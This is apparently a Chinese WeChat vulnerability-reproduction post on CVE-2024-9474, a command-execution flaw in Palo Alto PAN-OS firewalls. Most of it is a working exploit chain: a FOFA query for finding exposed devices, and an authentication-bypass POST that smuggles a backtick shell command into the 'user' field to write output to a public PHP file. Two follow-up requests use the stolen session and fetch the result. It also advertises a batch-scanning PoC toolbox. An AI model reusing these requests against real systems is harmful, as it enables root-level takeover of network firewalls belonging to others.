#  Palo Alto Networks PAN-OS存在远程命令执行漏洞CVE-2024-9474 附POC   
2024-12-10更新  南风漏洞复现文库   2024-12-10 15:50  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. Palo Alto Networks PAN-OS简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
Palo Alto Networks PAN-OS  
## 2.漏洞描述  
  
Palo Alto Networks PAN-OS是美国Palo Alto Networks公司的一套为其防火墙设备开发的操作系统。Palo Alto Networks PAN-OS存在安全漏洞，该漏洞源于存在权限提升漏洞，允许有权访问管理Web界面的PAN-OS管理员以root权限在防火墙上执行操作。  
  
CVE编号:CVE-2024-9474  
  
CNNVD编号:CNNVD-202411-2345  
  
CNVD编号:  
## 3.影响版本  
  
Palo Alto Networks PAN-OS  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvV6szpWnzrcMzwZKEqicjYbNxfiasxjUIsGW7hg8PMQ4g5BPz5nsaBnn3w/640?wx_fmt=png&from=appmsg "null")  
  
Palo Alto Networks PAN-OS存在远程命令执行漏洞  
## 4.fofa查询语句  
  
icon_hash="873381299"  
## 5.漏洞复现  
  
漏洞数据包，数据包会返回cookie值  
```
POST /php/utils/createRemoteAppwebSession.php/watchTowr.js.map HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent:Mozilla/5.0(Macintosh;IntelMac OS X 10_15_7)AppleWebKit/537.36(KHTML, like Gecko)Chrome/108.0.0.0Safari/537.36
X-PAN-AUTHCHECK: off
Host: xx.xx.xx.xx
Content-Length:98
Connection: close

user=`echo $(id) > /var/appweb/htdocs/unauth/gOFQTs.php`&userRole=superuser&remoteHost=&vsys=vsys1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvVPHq0MlQ1DZknQqQCSPnCIiaKghHUsUJujKTtGstMBHXhkWUmyZGV9Bw/640?wx_fmt=jpeg&from=appmsg "null")  
```
GET /index.php/.js.map HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Cookie: PHPSESSID=第一步获取的cookie
X-PAN-AUTHCHECK: off
Host: xx.xx.xx.xx
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvV0wNCmzIibkwDDYR1sreBxicVFhtCYSL54XAubY9WY0Iv1CjgkEE4ZicXQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
获取执行结果  
```
GET /unauth/gOFQTs.php HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Cookie: PHPSESSID=第一步获取的cookie
X-PAN-AUTHCHECK: off
Host: xx.xx.xx.xx
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvVG72kzoVsKWBicHxKL6e8bTibicZpOr4n90SHYOzkXQArudOXibVRszxicmw/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvVmZ3UOrhlfFAU6nWpP0XE3m1dicpKDeeGbRErTjCdaoN6Seon8yq2ZNg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvVzKtP1WJYYFcLiaoibWlPicdzibnxBzdKtUQpibDyERHvo0atROSpRj5iaKwA/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvV3icayQ7x4Qfj2Huccn6LJym0fgSd6PKZtdPlGOmoibP2UGPOgFo85TcQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvVrjFel9ibNWQj1K3vIKtibRERXAB4GWWichqxt9eapyjqRfG7V4kP2uHuw/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3awmMZXPhkeILeMtwZ9CmvVZXC66oglMOs8SiaYGZbAe9N2X6fUE0UWZTE41rLBI18u6EibQPOT8msA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
官方补丁 https://security.paloaltonetworks.com/CVE-2024-9474  
## 8.往期回顾  
  
  
[Zabbix api_jsonrpc.php接口存在SQL注入漏洞CVE-2024-42327 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487930&idx=1&sn=589b3837a2dc8ff72e861b99f6947f5d&scene=21#wechat_redirect)  
  
  
[九思OA软件jsoa/dl.jsp存在任意文件读取漏洞 附POC](https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247487916&idx=1&sn=636bdfae861e5c01986212c20de3bdd8&scene=21#wechat_redirect)  
  
  
